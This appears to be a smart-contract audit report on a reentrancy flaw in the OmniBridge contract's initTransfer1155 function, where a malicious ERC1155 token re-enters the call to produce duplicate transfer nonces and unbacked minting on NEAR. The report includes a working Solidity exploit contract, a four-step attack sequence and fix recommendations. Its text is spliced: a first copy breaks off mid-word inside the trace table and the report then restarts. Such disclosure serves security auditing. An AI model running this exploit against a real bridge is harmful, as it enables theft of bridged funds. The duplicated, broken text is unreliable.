Audit Report

## Title
Reentrancy in `initTransfer1155` via Malicious ERC1155 `safeTransferFrom` Causes Nonce Collision and Unauthorized Token Minting on NEAR — (File: evm/src/omni-bridge/contracts/OmniBridge.sol)

## Summary

`OmniBridge.initTransfer1155` increments `currentOriginNonce` before an external call to an attacker-controlled ERC1155 contract, but reads `currentOriginNonce` from storage again after that call when invoking `initTransferExtension` and emitting `InitTransfer`. No reentrancy guard exists anywhere in the contract. A malicious ERC1155 can re-enter `initTransfer1155` during `safeTransferFrom`, causing two `InitTransfer` events to be emitted with the same nonce while zero tokens are locked on EVM, enabling unauthorized minting on NEAR.

## Finding Description

`OmniBridge` inherits no `ReentrancyGuard` and applies no `nonReentrant` modifier. [1](#0-0) 

In `initTransfer1155`, the nonce is incremented at line 448, then an external call is made to the fully attacker-controlled `tokenAddress` at line 458, and `currentOriginNonce` is read from storage again at lines 471 and 483 — after the external call returns. [2](#0-1) [3](#0-2) [4](#0-3) 

The `onERC1155Received` guard (which rejects transfers where `operator != address(this)`) is irrelevant here: the bridge calls `safeTransferFrom` on the malicious contract, and the malicious contract's `safeTransferFrom` implementation is free to re-enter `initTransfer1155` directly without ever invoking `onERC1155Received` on the bridge. [5](#0-4) 

`logMetadata1155` is fully permissionless — any caller can register any `(tokenAddress, tokenId)` pair, including a malicious ERC1155. [6](#0-5) 

The base `initTransferExtension` only reverts if `value != 0`; with `nativeFee = 0` and `msg.value = 0`, `extensionValue = 0` and no revert occurs. [7](#0-6) 

**Reentrancy execution trace (nativeFee = 0, msg.value = 0):**

| Step | `currentOriginNonce` | Action |
|---|---|---|
| Outer call enters | 0 → **1** | `currentOriginNonce += 1` |
| Outer hits `sa

Audit Report

## Title
Reentrancy in `initTransfer1155` via Malicious ERC1155 `safeTransferFrom` Causes Nonce Collision and Unauthorized Token Minting — (`File: evm/src/omni-bridge/contracts/OmniBridge.sol`)

## Summary

`OmniBridge.initTransfer1155` increments `currentOriginNonce` before an external call to an attacker-controlled ERC1155 contract, but reads `currentOriginNonce` again from storage after that call when emitting `InitTransfer` and calling `initTransferExtension`. No reentrancy guard exists. A malicious ERC1155 can re-enter `initTransfer1155` during `safeTransferFrom`, causing both the inner and outer frames to emit `InitTransfer` events carrying the same nonce value while locking zero tokens on the EVM side, enabling unauthorized minting on NEAR.

## Finding Description

`OmniBridge` has no `ReentrancyGuard` and no `nonReentrant` modifier anywhere in the contract.

In `initTransfer1155`:

```solidity
currentOriginNonce += 1;                          // line 448 — nonce incremented to N
...
IERC1155(tokenAddress).safeTransferFrom(          // line 458 — external call to attacker-controlled contract
    msg.sender, address(this), tokenId, amount, ""
);
...
initTransferExtension(..., currentOriginNonce, ...); // line 471 — re-reads storage
emit BridgeTypes.InitTransfer(..., currentOriginNonce, ...); // line 483 — re-reads storage
```

The nonce is never cached into a local variable; both `initTransferExtension` and the `emit` re-read `currentOriginNonce` from storage after the external call returns.

The `onERC1155Received` guard at line 530 checks `operator != address(this)` and reverts with `ERC1155DirectSendNotAllowed`. However, this is called by the ERC1155 token contract on the bridge as recipient — a malicious ERC1155 controls its own `safeTransferFrom` implementation entirely and can re-enter `initTransfer1155` directly without ever calling `onERC1155Received` on the bridge. This guard provides zero reentrancy protection.

`logMetadata1155` is fully permissionless — any caller can register any `(tokenAddress, tokenId)` pair with no access control, enabling the attacker to register the malicious token before the attack.

`initTransfer1155` performs no whitelist check on `tokenAddress`, so any registered address is accepted.

**Reentrancy execution trace:**

| Step | `currentOriginNonce` | Action |
|---|---|---|
| Outer call enters | 0 → **1** | `currentOriginNonce += 1` |
| Outer hits `safeTransferFrom` | 1 | Malicious ERC1155 re-enters `initTransfer1155` |
| Inner call enters | 1 → **2** | `currentOriginNonce += 1` |
| Inner hits `safeTransferFrom` | 2 | Malicious ERC1155 returns (no tokens transferred) |
| Inner emits event | 2 | `InitTransfer(nonce=2)` — zero tokens locked |
| Outer `safeTransferFrom` returns | 2 | Malicious ERC1155 returns (no tokens transferred) |
| Outer emits event | 2 | `InitTransfer(nonce=2)` — zero tokens locked |

Nonce 1 is permanently consumed but never emitted. Two `InitTransfer` events with nonce 2 are emitted; zero ERC1155 tokens are held by the bridge. The NEAR side sees a valid on-chain event for nonce 2 and mints the corresponding bridged tokens to the attacker's NEAR address. The duplicate nonce-2 event is rejected by NEAR as already finalized.

## Impact Explanation

This constitutes **unauthorized minting of bridged funds**: tokens are created on NEAR with no corresponding collateral locked on EVM. This matches the allowed Critical impact: "unauthorized minting… that changes user or protocol balances" and "nonce/replay misuse… that changes user or protocol balances." Even if the NEAR side enforces sequential nonce processing, nonce 1 is permanently skipped, permanently freezing all subsequent bridge transfers — also a Critical impact (permanent freezing of bridged funds).

## Likelihood Explanation

The attack path is fully permissionless and requires no privileged role, no leaked key, no validator collusion, and no front-running:

1. Deploy a malicious ERC1155 contract.
2. Call `logMetadata1155(maliciousERC1155, tokenId)` — permissionless, no access control.
3. Wait for the NEAR relayer to index the `LogMetadata` event (seconds to minutes).
4. Call `initTransfer1155(maliciousERC1155, tokenId, amount, 0, 0, "near:attacker.near", "")`.

The attack is repeatable and requires only a standard EOA.

## Recommendation

1. **Add `ReentrancyGuard`**: Import OpenZeppelin's `ReentrancyGuard` and apply `nonReentrant` to both `initTransfer` and `initTransfer1155`.

2. **Cache the nonce locally**: Read `currentOriginNonce` into a local variable immediately after incrementing and use only that local variable in all subsequent references:

```solidity
function initTransfer1155(...) external payable nonReentrant whenNotPaused(PAUSED_INIT_TRANSFER) {
    currentOriginNonce += 1;
    uint64 originNonce = currentOriginNonce; // cache here
    ...
    IERC1155(tokenAddress).safeTransferFrom(...);
    ...
    initTransferExtension(..., originNonce, ...);
    emit BridgeTypes.InitTransfer(..., originNonce, ...);
}
```

Apply the same fix to `initTransfer` (lines 415–436), which has the same pattern.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract MaliciousERC1155 {
    address public bridge;
    bool private _reentered;

    constructor(address bridge_) { bridge = bridge_; }

    function safeTransferFrom(
        address, address,
        uint256 tokenId, uint256 amount, bytes calldata
    ) external {
        if (!_reentered) {
            _reentered = true;
            // Re-enter initTransfer1155; no ETH needed when nativeFee=0
            IOmniBridge(bridge).initTransfer1155(
                address(this), tokenId, uint128(amount),
                0, 0, "near:attacker.near", ""
            );
            // Return without transferring any tokens
        }
        // Inner frame: also return without transferring tokens
    }

    function balanceOf(address, uint256) external pure returns (uint256) { return 1e18; }
    function isApprovedForAll(address, address) external pure returns (bool) { return true; }
}

// Attack sequence:
// 1. Deploy MaliciousERC1155(bridge)
// 2. bridge.logMetadata1155(address(malicious), tokenId)   // permissionless
// 3. Wait for NEAR to index LogMetadata (~seconds)
// 4. bridge.initTransfer1155(address(malicious), tokenId, amount, 0, 0, "near:attacker.near", "")
//    → Two InitTransfer events emitted with nonce=2, zero tokens locked
//    → NEAR mints `amount` tokens to attacker.near for free
```

**Local test plan**: Deploy `OmniBridge` on a local fork, deploy `MaliciousERC1155`, call `logMetadata1155`, then call `initTransfer1155`. Assert that two `InitTransfer` events are emitted both with the same nonce, that `currentOriginNonce == 2` (skipping 1), and that the bridge holds zero ERC1155 tokens.

### Citations

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L28-33)
```text
contract OmniBridge is
    UUPSUpgradeable,
    AccessControlUpgradeable,
    SelectivePausableUpgradable,
    IERC1155Receiver
{
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L234-270)
```text
    function logMetadata1155(
        address tokenAddress,
        uint256 tokenId
    ) external payable {
        address deterministicToken = deriveDeterministicAddress(
            tokenAddress,
            tokenId
        );

        MultiTokenInfo storage multiToken = multiTokens[deterministicToken];

        if (multiToken.tokenAddress == address(0)) {
            multiToken.tokenAddress = tokenAddress;
            multiToken.tokenId = tokenId;
        } else {
            if (
                multiToken.tokenAddress != tokenAddress ||
                multiToken.tokenId != tokenId
            ) {
                revert ERC1155MappingMismatch();
            }
        }

        logMetadataExtension(
            deterministicToken,
            Strings.toHexString(tokenAddress),
            "",
            0
        );

        emit BridgeTypes.LogMetadata(
            deterministicToken,
            Strings.toHexString(tokenAddress),
            "",
            0
        );
    }
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L448-448)
```text
        currentOriginNonce += 1;
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L458-464)
```text
        IERC1155(tokenAddress).safeTransferFrom(
            msg.sender,
            address(this),
            tokenId,
            amount,
            ""
        );
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L468-483)
```text
        initTransferExtension(
            msg.sender,
            deterministicToken,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message,
            extensionValue
        );

        emit BridgeTypes.InitTransfer(
            msg.sender,
            deterministicToken,
            currentOriginNonce,
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L500-506)
```text
        string calldata /*message*/,
        uint256 value
    ) internal virtual {
        if (value != 0) {
            revert InvalidValue();
        }
    }
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L522-535)
```text
    function onERC1155Received(
        address operator,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external view override returns (bytes4) {
        // Only accept transfers that were initiated by this contract itself
        if (operator != address(this)) {
            revert ERC1155DirectSendNotAllowed();
        }

        return this.onERC1155Received.selector;
    }
```
